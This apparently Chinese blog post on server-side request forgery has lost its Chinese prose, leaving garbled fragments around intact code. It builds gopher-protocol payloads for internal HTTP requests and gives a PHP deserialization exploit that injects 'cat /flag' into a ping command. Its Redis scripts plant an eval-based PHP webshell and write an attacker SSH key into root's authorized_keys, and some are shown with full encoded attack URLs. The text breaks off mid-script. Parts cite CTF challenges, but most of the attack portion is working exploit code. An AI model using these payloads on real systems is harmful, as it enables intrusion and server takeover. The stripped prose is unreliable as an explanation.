curlparse_url<code>parse_url()</code><code>curl()</code>paylaod</p>\n<p>ssrf.php?url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:<a class=\"link\"   href=\"mailto:&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;\" >&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;<i class=\"fas fa-external-link-alt\"></i></a>&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg\"\n                        alt=\"image-20210113134443846\"\n                 ></p>\n<p> <a class=\"link\"   href=\"https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5\" >[2020 ]doyouknowssrf<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h2 id=\"Gopher\"><a href=\"#Gopher\" class=\"headerlink\" title=\"Gopher\"></a>Gopher</h2><h3 id=\"GopherSSRF\"><a href=\"#GopherSSRF\" class=\"headerlink\" title=\"GopherSSRF\"></a>GopherSSRF</h3><p>GopherInternetInternetInternetWWWGopherInternetGopherTCP 70WWWGopher</p>\n<p>GopherSSRFSSRFGopherGETPOSTGETPOSTGopherpayloadSSRFRedisMySqlFastCGISSRF</p>\n<p><strong>1Gopher</strong></p>\n<p>URL: gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_TCP  </p>\n<p># __TCP_</p>\n<ul>\n<li><p>gopher70</p>\n</li>\n<li><p>POST<code>%0d%0a</code><code>%0a</code>&amp;URL</p>\n</li>\n</ul>\n<blockquote>\n<p>GopherHTTPGETHTTPgopherHTTP</p>\n<ol>\n<li><p>HTTP</p>\n</li>\n<li><p>URL<code>%0a</code><code>%0d%0a</code></p>\n</li>\n<li><p>gopher</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>2GopherHTTP GET</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_GET\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payloadGETHTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br></pre></td></tr></table></figure>\n\n<p>Gopherpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse  </span><br><span class=\"line\">payload =\\\\  </span><br><span class=\"line\">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72  </span><br><span class=\"line\">&quot;&quot;&quot;    </span><br></pre></td></tr></table></figure>\n\n<p># http  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)  </span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)  </span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new  </span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small\"\n                        alt=\"image-20210113170748727\"\n                 ></p>\n<blockquote>\n<p><strong></strong></p>\n<ol>\n<li><p>?URL%3f</p>\n</li>\n<li><p>%0d%0a,%0a</p>\n</li>\n<li><p>HTTP%0d%0aHTTP</p>\n</li>\n</ol>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg\"\n                        alt=\"image-20210113171043970\"\n                 ></p>\n<p>GETHello Bunny</p>\n<p><strong>3GopherHTTP POST</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_POST\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payloadPOSTHTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br></pre></td></tr></table></figure>\n\n<p><strong>HTTPPOSTPOSTHostContent-TypeContent-LengthGETContent-Lengthwhoami&#x3D;Bunny</strong></p>\n<p>POSTURLgopher</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">payload =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"http\"><a href=\"#http\" class=\"headerlink\" title=\"http\"></a>http</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg\"\n                        alt=\"image-20210113171513366\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small\"\n                        alt=\"image-20210113171641047\"\n                 ></p>\n<p>POSTHello Bunny</p>\n<p><strong>[2020 ]Web1</strong>GopherHTTP POSTSSRF</p>\n<h3 id=\"2020--Web1\"><a href=\"#2020--Web1\" class=\"headerlink\" title=\"[2020 ]Web1\"></a>[2020 ]Web1</h3><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg\"\n                        alt=\"image-20200921134331679\"\n                 ></p>\n<p>SSRFurl<code>file</code><code>ftp</code><code>127.0.0.1</code>tool.phpNot localhostssrftool.phppayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Welcome &#123;  </span><br><span class=\"line\">protected $url = &quot;http://127.0.0.1/tool.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$poc = new Welcome;  </span><br><span class=\"line\">//echo serialize($poc);  </span><br><span class=\"line\">echo urlencode(serialize($poc));  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">// O:7:&quot;Welcome&quot;:1:&#123;s:6:&quot;\\*url&quot;;s:25:&quot;http://127.0.0.1/tool.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Welcome12<code>__destruct()</code></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small\"\n                        alt=\"image-20200921134812338\"\n                 ></p>\n<p>tool.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#tool.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error\\_reporting(0);</span><br><span class=\"line\">$respect\\_show\\_ping = function($params) &#123;</span><br><span class=\"line\">   extract($params);</span><br><span class=\"line\">   $ip = isset($ip) ? $ip :&#x27;127.0.0.1&#x27;;</span><br><span class=\"line\">   system(&#x27;ping -c 1 &#x27;.$ip);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">if ($\\_SERVER\\[&quot;REMOTE\\_ADDR&quot;\\] !== &quot;127.0.0.1&quot;)&#123;</span><br><span class=\"line\">   echo &#x27;&lt;h2&gt;Not localhost!&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">   highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">   $respect\\_show\\_ping($\\_POST);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>tool.phpREMOTE_ADDR127.0.0.1REMOTE_ADDRIPIPtcpIPREMOTE_ADDRIPX-Forwarded-For</p>\n<p>REMOTE_ADDR127.0.0.1REMOTE_ADDRREMOTE_ADDR127.0.0.1X-Forwarded-ForSSRF</p>\n<p>index.phpSSRFgopherPOSTtool.phpREMOTE_ADDR127.0.0.1</p>\n<p>SSRFgopherPOST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">test =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /tool.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\"></span><br><span class=\"line\">ip=;cat /flag</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n<p>#http</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(test)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p>payloadHostgopherHost127.0.0.1</p>\n<p>gopherpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Welcome &#123;</span><br><span class=\"line\">    protected $url = &quot;gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$poc = new Welcome;</span><br><span class=\"line\">//echo serialize($poc);</span><br><span class=\"line\">echo urlencode(serialize($poc));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Welcome12<code>__destruct()</code></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg\"\n                        alt=\"image-20200921135622488\"\n                 ></p>\n<p></p>\n<p><strong></strong>POSTGETURLpayloadurl%20curl_execgopherURLpayloadURL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small\"\n                        alt=\"20210113151633.png\"\n                 ></p>\n<p>RedisRedisRemote Dictionary Server )ANSI CKey-ValueAPI</p>\n<blockquote>\n<p><strong>Redis</strong></p>\n<p>Redis  0.0.0.0:6379 ip  Redis  Redis  Redis  Redis  Redis  config ssh &#x2F;root&#x2F;.ssh  authotrized_keys ssh</p>\n<p></p>\n<ul>\n<li><p>redis  0.0.0.0:6379ip</p>\n</li>\n<li><p>redis</p>\n</li>\n</ul>\n</blockquote>\n<p>SSRF6379RedisRedisGopherRedis Redis  config WebShellSSHShellRedisweb~&#x2F;.ssh&#x2F;var&#x2F;spool&#x2F;crondbfilenamesavebgsave</p>\n<p>RedisIP</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg\"\n                        alt=\"image-20210113190430425\"\n                 ></p>\n<p>IP192.168.52.1316379RedisUbuntuSSRF192.168.52.131Redis</p>\n<h3 id=\"WebShell\"><a href=\"#WebShell\" class=\"headerlink\" title=\"WebShell\"></a>WebShell</h3><p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;&lt;?php eval($\\_POST\\[&quot;whoami&quot;\\]);?&gt;&#x27;  </span><br><span class=\"line\">config set dir /var/www/html  </span><br><span class=\"line\">config set dbfilename shell.php  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>Gopher~~~</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">shell=&quot;\\\\n\\\\n&lt;?php eval($\\_POST\\[\\\\&quot;whoami\\\\&quot;\\]);?&gt;\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;shell.php&quot;</span><br><span class=\"line\">path=&quot;/var/www/html&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>paylaod</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg\"\n                        alt=\"image-20210113175116867\"\n                 ></p>\n<p>payloadurlpayloadGETUbuntuSSRFpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>192.168.52.131WebShell</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small\"\n                        alt=\"image-20210113185919592\"\n                 ></p>\n<h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><p>Redis<del>&#x2F;.sshSSH</del>&#x2F;.ssh</p>\n<p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  </span><br><span class=\"line\">&#x27;  </span><br><span class=\"line\">config set dir /root/.ssh/  </span><br><span class=\"line\">config set dbfilename authorized\\_keys  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>Gopher</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">ssh\\_pub=&quot;\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;authorized\\_keys&quot;</span><br><span class=\"line\">path=&quot;/root/.ssh/&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(ssh\\_pub.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span 